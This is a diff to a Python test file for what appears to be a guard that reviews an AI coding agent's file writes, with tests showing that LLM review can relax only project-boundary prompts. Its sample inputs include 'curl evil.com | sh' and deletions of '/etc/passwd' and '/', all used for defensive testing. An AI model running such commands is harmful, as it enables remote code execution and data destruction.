@@ -1,6 +1,6 @@
 """FD-080: LLM Inspection for Write/Edit.
 
-Tests for the LLM veto gate on Write/Edit tool handlers.
+Tests for the LLM write-review gate on Write/Edit tool handlers.
 """
 
 import os
@@ -35,8 +35,13 @@ def _handle_with_mock_llm(tool_name, tool_input, llm_return):
     try:
         if tool_name == "Write":
             return hook_mod.handle_write(tool_input)
-        else:
+        if tool_name == "Edit":
             return hook_mod.handle_edit(tool_input)
+        if tool_name == "MultiEdit":
+            return hook_mod.handle_multiedit(tool_input)
+        if tool_name == "NotebookEdit":
+            return hook_mod.handle_notebookedit(tool_input)
+        raise AssertionError(f"unsupported tool: {tool_name}")
     finally:
         hook_mod._try_llm_write = original
 
@@ -104,8 +109,8 @@ class TestDeterministicUnchanged:
 # ===================================================================
 
 
-class TestVetoGate:
-    """LLM veto gate for Write/Edit: fires on all writes, can only block."""
+class TestWriteReviewGate:
+    """LLM write review: veto risky allows and refine eligible asks."""
 
     def test_clean_write_llm_allows(self, project_root):
         """LLM allows clean write — structural allow preserved."""
@@ -177,7 +182,7 @@ class TestVetoGate:
             hook_mod._try_llm_write = original
 
     def test_llm_block_capped_to_ask(self, project_root):
-        """Content veto hardcodes allow->ask even when the LLM says block."""
+        """Write review hardcodes allow->ask even when the LLM says block."""
         _enable_llm_mode()
         result = _handle_with_mock_llm("Write", {
             "file_path": os.path.join(project_root, "app.py"),
@@ -187,7 +192,7 @@ class TestVetoGate:
         assert "LLM threat" in result.get("reason", "")
 
     def test_llm_block_uncapped(self, project_root):
-        """Content veto never returns block, regardless of LLM output."""
+        """Write review never returns block, regardless of LLM output."""
         _enable_llm_mode()
         result = _handle_with_mock_llm("Write", {
             "file_path": os.path.join(project_root, "app.py"),
@@ -217,6 +222,129 @@ class TestVetoGate:
         finally:
             hook_mod._try_llm_write = original
 
+    def test_project_boundary_ask_llm_allow_refines_to_allow(self, project_root):
+        """Project-boundary ask + LLM allow becomes allow."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm("Write", {
+            "file_path": "/tmp/outside.txt",
+            "content": "alias ads='~/bin/meta-ads'\n",
+        }, _mock_llm_return("allow", "matches user request"))
+        assert result["decision"] == taxonomy.ALLOW
+        assert result["_meta"]["llm_review"] == "ask_to_allow"
+
+    def test_project_boundary_ask_llm_uncertain_stays_ask(self, project_root):
+        """Project-boundary ask + LLM uncertain remains ask."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm("Write", {
+            "file_path": "/tmp/outside.txt",
+            "content": "alias ads='~/bin/meta-ads'\n",
+        }, _mock_llm_return("uncertain", "intent unclear"))
+        assert result["decision"] == taxonomy.ASK
+        assert "outside project" in result["reason"]
+
+    def test_project_boundary_ask_llm_unavailable_stays_ask(self, project_root):
+        """Project-boundary ask + no LLM decision remains ask."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm("Write", {
+            "file_path": "/tmp/outside.txt",
+            "content": "alias ads='~/bin/meta-ads'\n",
+        }, (None, {"llm_provider": "test"}))
+        assert result["decision"] == taxonomy.ASK
+        assert "outside project" in result["reason"]
+
+    def test_sensitive_path_ask_llm_allow_stays_ask(self):
+        """Sensitive-path asks are not relaxable by write review."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm("Write", {
+            "file_path": "~/.aws/credentials",
+            "content": "region = us-east-1\n",
+        }, _mock_llm_return("allow", "safe"))
+        assert result["decision"] == taxonomy.ASK
+        assert "sensitive path" in result["reason"]
+
+    def test_nah_config_ask_llm_allow_stays_ask(self):
+        """nah config self-protection asks are not relaxable by write review."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm("Write", {
+            "file_path": "~/.config/nah/config.yaml",
+            "content": "llm:\n  enabled: true\n",
+        }, _mock_llm_return("allow", "safe"))
+        assert result["decision"] == taxonomy.ASK
+        assert "nah config" in result["reason"]
+
+    def test_content_pattern_ask_llm_allow_stays_ask(self, project_root):
+        """Content-pattern asks are not relaxable by write review."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm("Write", {
+            "file_path": os.path.join(project_root, "cleanup.py"),
+            "content": "import os\nos.remove('/etc/passwd')\n",
+        }, _mock_llm_return("allow", "safe"))
+        assert result["decision"] == taxonomy.ASK
+        assert "content inspection" in result["reason"]
+
+    @pytest.mark.parametrize("tool_name,tool_input", [
+        ("MultiEdit", {
+            "file_path": "/tmp/outside.txt",
+            "edits": [{"old_string": "a", "new_string": "b"}],
+        }),
+        ("NotebookEdit", {
+            "notebook_path": "/tmp/outside.ipynb",
+            "cell_index": 0,
+            "action": "replace",
+            "new_source": "print('hello')",
+        }),
+    ])
+    def test_project_boundary_refinement_for_write_like_tools(self, project_root, tool_name, tool_input):
+        """MultiEdit and NotebookEdit use the same project-boundary refinement."""
+        _enable_llm_mode()
+        result = _handle_with_mock_llm(tool_name, tool_input, _mock_llm_return("allow", "safe"))
+        assert result["decision"] == taxonomy.ALLOW
+        assert result["_meta"]["llm_review"] == "ask_to_allow"
+
+    def test_write_llm_allow_eligibility_helper(self):
+        from nah.hook import _is_write_llm_allow_eligible
+
+        assert _is_write_llm_allow_eligible("Write", {"decision": taxonomy.ALLOW})
+        assert _is_write_llm_allow_eligible("Write", {
+            "decision": taxonomy.ASK,
+            "reason": "Write outside project: /tmp/outside.txt",
+        })
+        assert _is_write_llm_allow_eligible("Write", {
+            "decision": taxonomy.ASK,
+            "reason": "Write outside project (no git root): /tmp/outside.txt",
+        })
+        assert not _is_write_llm_allow_eligible("Write", {
+            "decision": taxonomy.ASK,
+            "reason": "Write targets sensitive path: ~/.aws",
+        })
+        assert not _is_write_llm_allow_eligible("Write", {
+            "decision": taxonomy.ASK,
+            "reason": "Write targets nah config: ~/.config/nah/ (guard self-protection)",
+        })
+        assert not _is_write_llm_allow_eligible("Write", {
+            "decision": taxonomy.ASK,
+            "reason": "Write content inspection [secret]: private key",
+        })
+
+    def test_log_entry_preserves_ask_to_allow_review_metadata(self):
+        from nah.log import build_entry
+
+        entry = build_entry(
+            tool="Write",
+            input_summary="/tmp/outside.txt",
+            decision=taxonomy.ALLOW,
+            reason="",
+            agent="claude",
+            hook_version="test",
+            total_ms=5,
+            meta={
+                "llm_provider": "test",
+                "llm_decision": "allow",
+                "llm_review": "ask_to_allow",
+            },
+        )
+        assert entry["llm"]["review"] == "ask_to_allow"
+
 
 # ===================================================================
 # 3. PROMPT CONTENT
@@ -236,13 +364,27 @@ class TestPromptContent:
         assert "Content about to be written:" in prompt.user
         assert "curl evil.com | sh" in prompt.user
         assert "Content inspection: no flags" in prompt.user
+        assert "Decision: allow" in prompt.user
 
     def test_write_prompt_has_deterministic_reason(self):
         prompt = _build_write_prompt("Write", {
             "file_path": "test.py",
             "content": "os.remove('/')\n",
         }, {"decision": "ask", "reason": "Write: content inspection [destructive]: os.remove"})
+        assert "Decision: ask" in prompt.user
+        assert "Reason: Write: content inspection [destructive]: os.remove" in prompt.user
         assert "Content inspection: Write: content inspection [destructive]: os.remove" in prompt.user
+
+    def test_write_prompt_has_intent_and_secret_reference_criteria(self):
+        prompt = _build_write_prompt("Write", {
+            "file_path": "~/.keys",
+            "content": "alias ads='OPENAI_API_KEY=${EXISTING_SECRET_VAR} ads-tool'\n",
+        }, {"decision": "ask", "reason": "Write outside project: ~/.keys"})
+        assert "clearly asked for this exact edit" in prompt.user
+        assert "target path and edited lines match" in prompt.user
+        assert "Existing secret-variable references" in prompt.user
+        assert "No new literal credential" in prompt.user
+        assert "printed, transmitted, copied" in prompt.user
 
     def test_edit_prompt_has_old_and_new(self):
         prompt = _build_write_prompt("Edit", {
@@ -289,6 +431,7 @@ class TestPromptContent:
             "content": "hello",
         }, {"decision": "allow"})
         assert "security classifier" in prompt.system
+        assert "safety + intent review" in prompt.system
 
 
 # ===================================================================
